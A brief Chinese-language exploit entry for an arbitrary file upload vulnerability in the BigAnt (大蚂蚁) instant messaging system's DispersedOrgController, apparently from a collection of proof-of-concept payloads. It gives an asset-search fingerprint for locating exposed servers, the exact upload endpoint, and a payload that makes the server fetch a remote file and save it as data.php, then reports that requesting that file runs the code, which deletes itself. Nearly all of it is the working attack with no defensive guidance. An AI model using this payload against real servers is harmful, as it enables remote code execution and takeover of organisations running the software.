# 大蚂蚁(BigAnt)即时通讯系统DispersedOrgController存在任意文件上传漏洞

大蚂蚁(BigAnt)即时通讯系统 ｜ 文件上传 ｜ —
- **指纹**：`product="即时通讯系统"`
- **请求**：`POST /?m=api&c=dispersedOrg&a=upload_file HTTP/1.1`

**Payload**
```
path=data.php&file_url=http://127.0.0.1:8001/data.txt&server_id=1
访问上传文件 data.php
成功[执行](https://mrxn.net/tag/rce)我们上传的文件，并删除自身
```
- **响应特征**：200